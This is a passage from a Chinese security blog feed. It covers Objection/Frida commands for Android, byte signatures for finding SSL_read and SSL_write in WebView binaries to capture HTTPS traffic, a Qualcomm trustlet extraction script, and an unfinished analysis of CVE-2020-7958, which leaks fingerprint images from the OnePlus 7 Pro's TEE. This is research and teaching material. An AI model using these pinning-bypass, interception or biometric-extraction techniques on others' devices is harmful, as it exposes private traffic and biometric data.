61” 字节匹配搜索<br><img src="/images/pasted-253.png" alt="upload successful"></li><li>memory write 0xfffff “frida” (–string) 修改内存</li></ul><h4 id="android相关"><a href="#android相关" class="headerlink" title="android相关"></a>android相关</h4><h5 id="组件相关（activity-services-receivers）"><a href="#组件相关（activity-services-receivers）" class="headerlink" title="组件相关（activity/services/receivers）"></a>组件相关（activity/services/receivers）</h5><p>android hooking list activities<br>android hooking list services<br>android hooking list receivers<br>android hooking get current_activity 获取当前activity<br>android intent launch_activity  xxxx  启动指定activity<br>android intent launch_service xxxx 启动指定service</p><h5 id="class和method相关"><a href="#class和method相关" class="headerlink" title="class和method相关"></a>class和method相关</h5><p>android hooking list classes 列出所有加载的类<br>android hooking search classes xxxx 搜索包含关键字的类<br>android hooking search methods xxxx 搜索包含关键字的方法<br>android hooking list class_methods xxxx 列出类的所有方法<br><img src="/images/pasted-257.png" alt="upload successful"><br>android heap search instances xxx  查找类的所有实例<br><img src="/images/pasted-258.png" alt="upload successful"></p><h5 id="hook相关"><a href="#hook相关" class="headerlink" title="hook相关"></a>hook相关</h5><p>android hooking generate simple xxxx 生成hook代码，默认对指定类的所有方法hook<br>android hooking watch class xxxx hook类的所有方法(–dump-args –dump-backtrace –dump-return 显示参数、返回值、调用栈)<br><img src="/images/pasted-261.png" alt="upload successful"><br>android hooking watch class_method class_func_xxx  hook指定的方法，包含所有重载<br><img src="/images/pasted-260.png" alt="upload successful"><br>android heap execute instance_ID function  主动调用指定实例的函数<br>使用jobs list命令可以看到所有的hook情况<br><img src="/images/pasted-259.png" alt="upload successful"><br>jobs kill job_id取消hook</p><h5 id="其他常用操作"><a href="#其他常用操作" class="headerlink" title="其他常用操作"></a>其他常用操作</h5><p>android sslpinning disable 去掉证书绑定<br><img src="/images/pasted-263.png" alt="upload successful"><br>android clipboard monitor 监控剪贴板<br>android keystore list  列出keystore，常用于国外APP</p><p><img src="/images/pasted-264.png" alt="upload successful"><br>android root disable 对APP隐藏root<br>android shell_exec ls  执行命令<br>android ui FLAG_SECURE true  设置当前activity的FLAG_SECURE<br>android ui screenshot /sdcard/1.png  截屏</p><p>objection patchapk –source app-release.apk patch安装包，将frida-agent打包到APP里</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>自动定位webview中的SLL_read和SSL_write</title>
      <link href="/2020/07/24/%E8%87%AA%E5%8A%A8%E5%AE%9A%E4%BD%8Dwebview%E4%B8%AD%E7%9A%84SLL-read%E5%92%8CSSL-write/"/>
      <url>/2020/07/24/%E8%87%AA%E5%8A%A8%E5%AE%9A%E4%BD%8Dwebview%E4%B8%AD%E7%9A%84SLL-read%E5%92%8CSSL-write/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在Android上抓https包是一件非常头疼的事情，随着android的不断升级，你可能面临导入用户证书、导入根证书、解决证书绑定、双向绑定等等一系列复杂的操作，之前的文章 <a href="https://mabin004.github.io/2018/03/05/https%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86/">Android Https抓包实践</a> 中记录了APP抓包时踩过的很多坑，抓包配环境的繁琐令人非常痛苦。</p><p>基于frida的ssl_logger直接从底层hook SSL_read和SSL_write函数进行抓包，似乎解决了导证书、SSL pining等麻烦，但无法抓取APP内置webview发出的包，这是因为ssl_logger是通过hook 系统的ssl库来抓包，而Webview(Chromium)将boringssl的代码静态编译到了自己的二进制文件中，在收发https数据包时，不会调用系统的SSL库，因此也就无法抓包了。</p><p>由于编译后的webview二进制文件是无符号的，要通过hook的方式抓webview发出的https包，就要找到SSL_read和SSL_write符号。</p><h2 id="定位SSL-read和SSL-write"><a href="#定位SSL-read和SSL-write" class="headerlink" title="定位SSL_read和SSL_write"></a>定位SSL_read和SSL_write</h2><p>找到SSL_read和SSL_write偏移的方法参考<a href="https://nytrosecurity.com/2018/02/26/hooking-chromes-ssl-functions/" target="_blank" rel="noopener">Hooking Chrome’s SSL functions</a> 。文章中定位方法是在windows上操作的，android上的webview共享同一套代码，因此同样适用。</p><p>定位SSL_read和SSL_write的方法主要如下：</p><p>（1）根据webview版本号(<a href="https://chromium.googlesource.com/chromium/src.git/+refs" target="_blank" rel="noopener">chrome源码</a>)找到chromium源码中使用的boringssl版本(DEPS文件)；</p><p>（2）找到对应boringssl<a href="https://boringssl.googlesource.com/boringssl/+/94cd196a80252c98e329e979870f2a462cc4f402/ssl/ssl_lib.cc" target="_blank" rel="noopener">代码</a>中的ssl_lib.cc文件，SSL_read和SSL_write代码中ERR_put_error函数会输出行号；</p><p>ssl_write和ssl_read(调用ssl_peek)调用了OPENSSL_PUT_ERROR,最后一个参数未代码行号，因此根据代码行号去汇编中查找对应指令即可:</p><p><img src="/images/pasted-246.png" alt="upload successful"></p><p><img src="/images/pasted-247.png" alt="upload successful"></p><p>（3）根据错误行号，在binary中搜索特征片段，定位到对应函数；</p><p>binary特征片段如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">#define OPENSSL_PUT_ERROR(library, reason) ERR_put_error(ERR_LIB_##library, 0, reason, __FILE__, __LINE__)</span><br><span class="line"></span><br><span class="line">SSL_read(SSL_peek) 32位特征：ERR_put_error(16, 0, 66, &quot;../../third_party/boringssl/src/ssl/ssl_lib.cc&quot;, 0x431);</span><br><span class="line">PUSH            &#123;R3-R7,LR&#125;        F8 B5</span><br><span class="line">MOV             R7, R0             </span><br><span class="line">LDR             R0, [R0,#0x50]</span><br><span class="line">CBZ             R0, loc_1779BC6</span><br><span class="line">MOVW            R0, #0x431        40 F2 31 40</span><br><span class="line">MOVS            R1, #0            00 21</span><br><span class="line">STR             R0, [SP,#0x18+var_18]</span><br><span class="line">MOVS            R0, #0x10         10 20</span><br><span class="line">LDR             R3, loc_1779BFC</span><br><span class="line">MOVS            R2, #0x42 ; &apos;B&apos;   42 22</span><br><span class="line">MOVS            R4, #0</span><br><span class="line">ADD             R3, PC  ; &quot;../../third_party/boringssl/src/ssl/ssl&quot;...</span><br><span class="line">BL              sub_17359F2</span><br><span class="line"></span><br><span class="line">SSL_write 32位特征：ERR_put_error(16, 0, 66, &quot;../../third_party/boringssl/src/ssl/ssl_lib.cc&quot;, 0x446);</span><br><span class="line">MOVW            R0, #0x446</span><br><span class="line">MOVS            R1, #0               00 21</span><br><span class="line">STR             R0, [SP,#0x20+var_20]</span><br><span class="line">MOVS            R0, #0x10            10 20</span><br><span class="line">LDR             R3, =(aThirdPartyBori_31 - 0x1779DC2)</span><br><span class="line">MOVS            R2, #0x42 ; &apos;B&apos;      42 22</span><br><span class="line">MOVS            R7, #0</span><br><span class="line">ADD             R3, PC  ; &quot;../../third_party/boringssl/src/ssl/ssl&quot;...</span><br><span class="line">BL              sub_17359F2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SSL_write  64位特征:</span><br><span class="line">FD 7B BD A9                 STP             X29, X30, [SP,#-0x30]!</span><br><span class="line">F5 0B 00 F9                 STR             X21, [SP,#0x10]</span><br><span class="line">F4 4F 02 A9                 STP             X20, X19, [SP,#0x20]</span><br><span class="line">FD 03 00 91                 MOV             X29, SP</span><br><span class="line">F3 03 02 2A                 MOV             W19, W2</span><br><span class="line">F4 03 01 AA                 MOV             X20, X1</span><br><span class="line">F5 03 00 AA                 MOV             X21, X0</span><br><span class="line">31 FA FF 97                 BL              sub_2356E78</span><br><span class="line">A8 4E 40 F9                 LDR             X8, [X21,#0x98]</span><br><span class="line">A8 01 00 B4                 CBZ             X8, loc_23585F0</span><br><span class="line">03 30 FF 90                ADRL            X3, aThirdPartyBori_4 ; &quot;../../third_party/boringssl/src/ssl/ssl&quot;...</span><br><span class="line">63 F0 11 91</span><br><span class="line">00 02 80 52                 MOV             W0, #0x10</span><br><span class="line">42 08 80 52                 MOV             W2, #0x42 ; &apos;B&apos;</span><br><span class="line">C4 88 80 52                 MOV             W4, #0x446   //第四个参数</span><br><span class="line">E1 03 1F 2A                 MOV             W1, WZR</span><br><span class="line">C0 B3 FE 97                 BL              sub_23054D8</span><br><span class="line">E0 03 1F 2A                 MOV             W0, WZR</span><br><span class="line"></span><br><span class="line">SSL_read(SSL_peek)64位:</span><br><span class="line">FD 7B BD A9                 STP             X29, X30, [SP,#-0x10+var_20]!</span><br><span class="line">F5 0B 00 F9                 STR             X21, [SP,#0x20+var_10]</span><br><span class="line">F4 4F 02 A9                 STP             X20, X19, [SP,#0x20+var_s0]</span><br><span class="line">FD 03 00 91                 MOV             X29, SP</span><br><span class="line">08 4C 40 F9                 LDR             X8, [X0,#0x98]</span><br><span class="line">C8 01 00 B4                 CBZ             X8, loc_2358324</span><br><span class="line">03 30 FF 90+                ADRL            X3, aThirdPartyBori_4 ; &quot;../../third_party/boringssl/src/ssl/ssl&quot;...</span><br><span class="line">63 F0 11 91</span><br><span class="line">00 02 80 52                 MOV             W0, #0x10</span><br><span class="line">42 08 80 52                 MOV             W2, #0x42 ; &apos;B&apos;</span><br><span class="line">24 86 80 52                 MOV             W4, #0x431  //第4个参数</span><br><span class="line">E1 03 1F 2A                 MOV             W1, WZR</span><br><span class="line">74 B4 FE 97                 BL              sub_23054D8</span><br></pre></td></tr></table></figure></p><h2 id="测试记录"><a href="#测试记录" class="headerlink" title="测试记录"></a>测试记录</h2><p>基于上述特征，我编写了自动化脚本，对webview二进制文件中的SLL_read和SSL_write符号进行自动化提取。尽管原理简单，但实现起来需要区分32位和64位，以及需要解决一些编译器引发的指令差异问题，实现起来也比较麻烦，我用了keystone和capstone来辅助搞定了自动化工具，这里就不分享了。</p><p>用我的自动化脚本在基于Chromium的几大主流webview进行了测试，输入binary路径和版本号就可以稳定运行，跑出SSL_read和SSL_write的偏移，以下是常见的几种webview：</p><h3 id="Chrome-APP"><a href="#Chrome-APP" class="headerlink" title="Chrome APP"></a>Chrome APP</h3><p>Chrome APP自带webview引擎，安装包内的crazy.ibchrome.so对应webview的二进制文件，安装完成后，在不同版本的系统上的名字不同：</p><ul><li>Android L &amp; M  libchrome.so</li><li>Android N, O &amp; P libmonochrome.so</li></ul><p>当手机上安装Chrome时，系统内置的webview会设置为chrome的webview，当然定制的系统除外，例如国内的华米OV使用自己的webview。</p><h3 id="系统内置webview"><a href="#系统内置webview" class="headerlink" title="系统内置webview"></a>系统内置webview</h3><p>Android系统内置webview的版本可用（adb shell dumpsys webviewupdate）查到：</p><p><img src="/images/pasted-244.png" alt="upload successful"></p><p>installed/enabled的即为系统默认的webview。</p><p>使用（pm path com.google.android.webview）得到webview的路径：</p><p><img src="/images/pasted-245.png" alt="upload successful"></p><h3 id="浏览器APP的webview"><a href="#浏览器APP的webview" class="headerlink" title="浏览器APP的webview"></a>浏览器APP的webview</h3><p>Android上的浏览器APP通常会使用自己的webview引擎，一般来说安装包体积小于十多兆的浏览器（例如X浏览器、隐私浏览器等等）使用的系统自带的webview，安装包较大（50M+）的浏览器会使用自己的webview。例如：</p><p>手机厂商自带的浏览器：</p><ul><li>libheytapwebview.so  OPPO</li><li>libhwwebviewchromium.so 华为</li><li>libmiui_chromium.so 小米</li><li>libwebviewchromium_vivo.so  vivo</li></ul><p>第三方浏览器：</p><ul><li>libmttwebview.so  qq浏览器</li><li>libwebviewuc.so  UC浏览器</li></ul><h3 id="基于Chromium的第三方浏览器内核"><a href="#基于Chromium的第三方浏览器内核" class="headerlink" title="基于Chromium的第三方浏览器内核"></a>基于Chromium的第三方浏览器内核</h3><ul><li>libmttwebview.so  x5内核，腾讯系的APP使用</li><li>libwebviewuc.so  UC的U4内核  阿里小的APP使用</li><li>libxwalkcore.so CrossWalk内核  常用于各种小程序的实现</li></ul><h3 id="使用多内核的APP"><a href="#使用多内核的APP" class="headerlink" title="使用多内核的APP"></a>使用多内核的APP</h3><p>有些APP会使用多个内核，以微信为例，同时使用了X5和CrossWalk内核：</p><ul><li>x5 com.tencent.mm:tools进程 聊天页面点开的webview、支付里的页面（长按下拉提示使用x5内核的都可以）</li><li>CrossWalk （长按下拉未提示x5）<ul><li>com.tencent.mm:toolsmp 进程  公众号文章、搜一搜</li><li>com.tencent.mm:appbrand 进程  小程序</li></ul></li></ul><h2 id="通用的APP抓https包方案"><a href="#通用的APP抓https包方案" class="headerlink" title="通用的APP抓https包方案"></a>通用的APP抓https包方案</h2><p>通过上文的分析，通用的APP抓https包的方案需要结合以下三种情况：</p><ol><li>hook 系统的SSL_read和SSL_write</li><li>hook webview的SSL_read和SSL_write</li><li>必要时hook APP自带ssl库的SSL_read和SSL_write</li></ol><p>此方案的优点是不需要设置代理、导证书、解决证书绑定等繁琐操作，直接从底层获取明文的https包，无视上层实现。缺点是需要找到SSL_read和SSL_write的偏移，当然有了自动化脚本，抓起包来会非常轻松。</p><p>参考链接：</p><ol><li>chrome源码 <a href="https://chromium.googlesource.com/chromium/src.git" target="_blank" rel="noopener">https://chromium.googlesource.com/chromium/src.git</a></li><li>boringssl源码 <a href="https://boringssl.googlesource.com/" target="_blank" rel="noopener">https://boringssl.googlesource.com/</a></li><li><a href="https://www.anquanke.com/post/id/104801" target="_blank" rel="noopener">通过Hooking Chrome浏览器的SSL函数实现读取SSL通信数据</a></li><li>chrome webview docs <a href="https://chromium.googlesource.com/chromium/src/+/HEAD/android_webview/docs/build-instructions.md" target="_blank" rel="noopener">https://chromium.googlesource.com/chromium/src/+/HEAD/android_webview/docs/build-instructions.md</a></li><li>Shared Libraries on Android <a href="https://chromium.googlesource.com/chromium/src.git/+/master/docs/android_native_libraries.md" target="_blank" rel="noopener">https://chromium.googlesource.com/chromium/src.git/+/master/docs/android_native_libraries.md</a></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>高通QSEE中Trustlet提取</title>
      <link href="/2020/07/06/%E9%AB%98%E9%80%9AQSEE%E4%B8%ADTrustlet%E6%8F%90%E5%8F%96/"/>
      <url>/2020/07/06/%E9%AB%98%E9%80%9AQSEE%E4%B8%ADTrustlet%E6%8F%90%E5%8F%96/</url>
      
        <content type="html"><![CDATA[<h2 id="Trustlet提取"><a href="#Trustlet提取" class="headerlink" title="Trustlet提取"></a>Trustlet提取</h2><p>QSEE架构的Trustlet通常放在/firmware目录(/vendor/firmware_mnt的软连接)，每个模块被分割为多个文件，以xxxx.b0x形式存在，每个模块对应一个mdt文件，如下图：</p><p><img src="/images/pasted-236.png" alt="upload successful"></p><p>其中，mdt文件保存了elf文件头以及证书，使用binwalk可以看到包含一个elf头和3个DER证书文件头：</p><p><img src="/images/pasted-237.png" alt="upload successful"></p><p>利用readelf可以看到elf文件分割后的偏移：<br>（mdt文件的elf头和xxxx.b00的文件头相同）</p><p><img src="/images/pasted-238.png" alt="upload successful"></p><p>基于这些信息，编写提取Truset的脚本<a href="https://github.com/pandasauce/unify_trustlet/blob/master/unify_trustlet.py" target="_blank" rel="noopener">参考</a>如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">import sys, os, struct</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line"></span><br><span class="line">    #Reading the arguments</span><br><span class="line">    if len(sys.argv) != 4:</span><br><span class="line">        print &quot;USAGE: &lt;TRUSTLET_DIR&gt; &lt;TRUSTLET_NAME&gt; &lt;OUTPUT_FILE_PATH&gt;&quot;</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    trustlet_dir = sys.argv[1]</span><br><span class="line">    trustlet_name = sys.argv[2]</span><br><span class="line">    output_file_path = sys.argv[3]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    flag = open(os.path.join(trustlet_dir, &quot;%s.mdt&quot; % trustlet_name), &quot;rb&quot;).read(5)[4]</span><br><span class="line">    if flag == &apos;\x01&apos;:</span><br><span class="line">        bitness = 32</span><br><span class="line">    if flag == &apos;\x02&apos;:</span><br><span class="line">        bitness = 64</span><br><span class="line"></span><br><span class="line">    if (bitness == 64):</span><br><span class="line">        ELF_HEADER_SIZE = 0x40</span><br><span class="line">        E_PHNUM_OFFSET = 0x38</span><br><span class="line">        PHDR_SIZE = 0x38</span><br><span class="line">        P_FILESZ_OFFSET = 0x20</span><br><span class="line">        P_OFFSET_OFFSET = 0x8</span><br><span class="line">    else:</span><br><span class="line">        ELF_HEADER_SIZE = 0x34</span><br><span class="line">        E_PHNUM_OFFSET = 0x2C</span><br><span class="line">        PHDR_SIZE = 0x20</span><br><span class="line">        P_FILESZ_OFFSET = 0x10</span><br><span class="line">        P_OFFSET_OFFSET = 0x4</span><br><span class="line"></span><br><span class="line">    #Reading the ELF header from the &quot;.mdt&quot; file</span><br><span class="line">    mdt = open(os.path.join(trustlet_dir, &quot;%s.mdt&quot; % trustlet_name), &quot;rb&quot;)</span><br><span class="line">    elf_header = mdt.read(ELF_HEADER_SIZE)</span><br><span class="line"></span><br><span class="line">    phnum = struct.unpack(&quot;&lt;H&quot;, elf_header[E_PHNUM_OFFSET:E_PHNUM_OFFSET+2])[0]</span><br><span class="line">    print &quot;[+] Found %d program headers&quot; % phnum</span><br><span class="line">    </span><br><span class="line">    #Reading each of the program headers and copying the relevant chunk</span><br><span class="line">    output_file = open(output_file_path, &apos;wb&apos;)</span><br><span class="line">    for i in range(0, phnum):</span><br><span class="line"></span><br><span class="line">        #Reading the PHDR</span><br><span class="line">        print &quot;[+] Reading PHDR %d&quot; % i</span><br><span class="line">        phdr = mdt.read(PHDR_SIZE)  </span><br><span class="line">        p_filesz = struct.unpack(&quot;&lt;I&quot;, phdr[P_FILESZ_OFFSET:P_FILESZ_OFFSET+4])[0] </span><br><span class="line">        p_offset= struct.unpack(&quot;&lt;I&quot;, phdr[P_OFFSET_OFFSET:P_OFFSET_OFFSET+4])[0] </span><br><span class="line">        print &quot;[+] Size: 0x%08X, Offset: 0x%08X&quot; % (p_filesz, p_offset)</span><br><span class="line"></span><br><span class="line">        if p_filesz == 0:</span><br><span class="line">            print &quot;[+] Empty block, skipping&quot;</span><br><span class="line">            continue #There&apos;s no backing block</span><br><span class="line"></span><br><span class="line">        #Copying out the data in the block</span><br><span class="line">        block = open(os.path.join(trustlet_dir, &quot;%s.b%02d&quot; % (trustlet_name, i)), &apos;rb&apos;).read()</span><br><span class="line">        output_file.seek(p_offset, 0)</span><br><span class="line">        output_file.write(block)</span><br><span class="line"></span><br><span class="line">    mdt.close()</span><br><span class="line">    output_file.close()</span><br><span class="line"></span><br><span class="line">def parse_DER():</span><br><span class="line">    if len(sys.argv) != 4:</span><br><span class="line">        print &quot;USAGE: &lt;TRUSTLET_DIR&gt; &lt;TRUSTLET_NAME&gt; &lt;OUTPUT_FILE_PATH&gt;&quot;</span><br><span class="line">        return</span><br><span class="line">    trustlet_dir = sys.argv[1]</span><br><span class="line">    trustlet_name = sys.argv[2] </span><br><span class="line">    mdt = open(os.path.join(trustlet_dir, &quot;%s.mdt&quot; % trustlet_name), &quot;rb&quot;)</span><br><span class="line">    certs = mdt.read()</span><br><span class="line">    certs_index = []</span><br><span class="line"></span><br><span class="line">    for i in range(0x34,len(certs)-5):</span><br><span class="line">        if certs[i] == &apos;\x30&apos; and certs[i+1] == &apos;\x82&apos; and certs[i+4] == &apos;\x30&apos; and certs[i+5] == &apos;\x82&apos;:            </span><br><span class="line">            certs_index.append(i)</span><br><span class="line">    certs_index.append(len(certs))        </span><br><span class="line">        </span><br><span class="line">    print certs_index</span><br><span class="line">    for i in range(len(certs_index)-1):</span><br><span class="line">        start = certs_index[i]</span><br><span class="line">        end = certs_index[i+1]</span><br><span class="line">        certname = &quot;cert_&quot;+str(start)+&quot;.der&quot;</span><br><span class="line">        print certname</span><br><span class="line">        open(certname,&apos;wb&apos;).write(bytes(certs[start : end]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br><span class="line">    parse_DER()</span><br></pre></td></tr></table></figure></p><h3 id="简单逆向分析"><a href="#简单逆向分析" class="headerlink" title="简单逆向分析"></a>简单逆向分析</h3><p>高通的QSEE核心逻辑在libQSEECom.so中，实现Trustlet的加载和解析。</p><p>Trustlet模块加载入口在QSEECom_start_app：</p><p><img src="/images/pasted-239.png" alt="upload successful"></p><p>调用_QSEECom_get_handle完成加载:</p><p><img src="/images/pasted-240.png" alt="upload successful"></p><p>主要操作有包括打开/dev/qseecom，使用ioctls通信<br>sub_1B00实现了mdt文件的解析，加载分割后的elf文件，完成加载过程。</p><p><img src="/images/pasted-241.png" alt="upload successful"></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>CVE-2020-7958-从手机中提取指纹图片</title>
      <link href="/2020/07/01/CVE-2020-7958-%E4%BB%8E%E6%89%8B%E6%9C%BA%E4%B8%AD%E6%8F%90%E5%8F%96%E6%8C%87%E7%BA%B9%E5%9B%BE%E7%89%87/"/>
      <url>/2020/07/01/CVE-2020-7958-%E4%BB%8E%E6%89%8B%E6%9C%BA%E4%B8%AD%E6%8F%90%E5%8F%96%E6%8C%87%E7%BA%B9%E5%9B%BE%E7%89%87/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>众所周知，TrustZone被广泛应用在现在的手机设备中。TrustZone将SoC的硬件和软件资源划分为安全(Secure World)和非安全(Normal World)两个世界，内核、操作系统、上层应用等运行在Normal World，人脸指纹等生物数据识别、支付、加密等操作在Secure World中运行。这样即使设备被ROOT, 也只能意味着Normal World被攻击者控制，人脸指纹等一些极度敏感的数据不会被泄露。</p><p><img src="/images/pasted-220.png" alt="upload successful"></p><p>当前主流的TrustZone厂商与产品有：Intel的SGX，Qualcomm的QSEE，Huawei HiSilicon的Trusted Core以及Samsung的Kinibi。</p><p><a href="https://www.synopsys.com/blogs/software-security/cve-2020-7958/" target="_blank" rel="noopener">CVE-2020-7958</a>是Oneplus 7Pro上指纹识别模块的一个漏洞，使用了高通的QSEE，该漏洞由Synopsys Cybersecurity Research Center发现和披露，本文对其进行分析和重现，编写exp实现了从TrustZone里提取原始的指纹图片。</p><p>为便于理解，在文章开始之前，将几个相关缩略词列举如下：</p><ul><li>TEE<br>Trusted Execution Environment, 可信执行环境，即Secure World</li><li>REE<br>Rich Execution Environment，开发执行环境，即Normal World</li><li>TA<br>Trusted Application，可信应用，即可信环境内执行的程序</li><li>Trustlet<br>等同于TA</li></ul><h2 id="指纹识别TEE架构"><a href="#指纹识别TEE架构" class="headerlink" title="指纹识别TEE架构"></a>指纹识别TEE架构</h2><p>Android对指纹识别的实现作了要求（参考<a href="https://source.android.com/compatibility/9/android-9-cdd.html#7_3_10_biometric_sensors" target="_blank" rel="noopener">官方文档</a>），例如指纹匹配必须在TEE中进行，指纹数据也必须进行加密，保证在TEE外无法读取和更改。</p><p>Android上指纹识别相关架构如下图所示，其中红框部分处于REE中，即如果有root权限是可以操控的。指纹的匹配、存储等操作位于TEE中。REE通过Fingerprint HAL与TEE进行交互，TEE处理对应的指令后返回执行后的结果。整个过程中的指纹录入、数据处理、匹配算法对于REE来说就是一个黑盒子，REE只能知道执行结果却无法触及具体实现。</p><p><img src="/images/pasted-222.png" alt="upload successful"></p><p>TEE只是用来执行可信的TA（或Trustlet），TA保存在Normal World,在获取系统权限后，我们可以在根目录（一般在/vendor目录）找到TA的binary文件，通过对TA进行逆向分析，可以推测TEE中的执行逻辑，挖掘相关的漏洞。</p><h2 id="CVE-2020-7958分析"><a href="#CVE-2020-7958分析" class="headerlink" title="CVE-2020-7958分析"></a>CVE-2020-7958分析</h2><p>指纹芯片厂商为了方便手机厂商调试，会添加很多调试接口，例如dump出指纹图片便于优化算法。然后，手机厂商在发布设备时如果没有对这些调式接口进行合理的屏蔽，甚至直接原封不动的使用芯片厂商的代码，这些危险的接口就会出现在了正式发布的设备中。攻击者拿到系统权限后，在REE直接调用这些接口，就可能获取trustzone中的敏感数据。</p><p>OnePlus 7 Pro采用高通的QSEE架构，其指纹芯片使用汇顶的解决方案，CVE-2020-7958这个漏洞就是利用了工厂模式下的接口，成功的把TEE中的指纹图片dump出来。</p><p>OnePlus 7 Pro的指纹相关逻辑主要位于以下几个模块中：</p><ul><li>libgf_ud_hal.so (/vendor/lib64/目录)</li><li>libQSEEComAPI.so</li><li>Trustlet<br>其中libgf_ud_hal.so属于REE，主要负责调度和发送指令给TEE,libQSEEComAPI.so是REE和TEE的中间桥梁，根据REE中不同的指令代码来调用TEE中不同的TA模块。</li></ul><p>CVE-2020-7958存在于OnePlus 7 Pro的TA中，实现了一个sz_factory_test_capture_image接口暴露给REE，允许其将捕获的指纹图片dump出来。</p><p><img src="/images/pasted-223.png" alt="upload successful"></p><p>下文对逆向过程进行分析：</p><h3 id="TA逆向"><a href="#TA逆向" class="headerlink" title="TA逆向"></a>TA逆向</h3><p>通过grep关键字，我们可以发现指纹处理的TA位于/vendor/firmware_mnt/image目录中<br><img src="/images/pasted-224.png" alt="upload successful"><br>这几个文件需要处理后拼接为一个elf文件(readelf根据offset和length拼接，剩余部分用’\x00‘填充，参考<a href="https://github.com/pandasauce/unify_trustlet/blob/master/unify_trustlet.py)，拼接完成后拖到IDA进一步分析。" target="_blank" rel="noopener">https://github.com/pandasauce/unify_trustlet/blob/master/unify_trustlet.py)，拼接完成后拖到IDA进一步分析。</a><br>通过跟踪elf中的日志信息，找到gf_modules_cmd_entry_point</p><p><img src="/images/pasted-225.png" alt="upload successful"><br>根据cmd值找对应的module</p><p><img src="/images/pasted-226.png" alt="upload successful"><br>一共有g_sensor_module、g_algo_module、g_auth_module和g_product_test_module 4个模块</p><p><img src="/images/pasted-227.png" alt="upload successful"></p><p>其中g_product_test_module结构如下,0xEB对对应的module_id</p><p><img src="/images/pasted-231.png" alt="upload successful"><br>根据调用关系”sub_5C34（module_start()） -&gt; gf_product_test_start -&gt; gf_product_test_create -&gt; gf_sz_product_test_ctor“继续跟进</p><p><img src="/images/pasted-228.png" alt="upload successful"></p><p>gf_sz_factory_test_ctor<br><img src="/images/pasted-229.png" alt="upload successful"><br>因此，module_start()构造的函数表及对应索引如下：</p><p><img src="/images/pasted-232.png" alt="upload successful"></p><p>根据调用关系”sub5D18(module_entry()) -&gt; gf_product_test_cmd_entry -&gt; 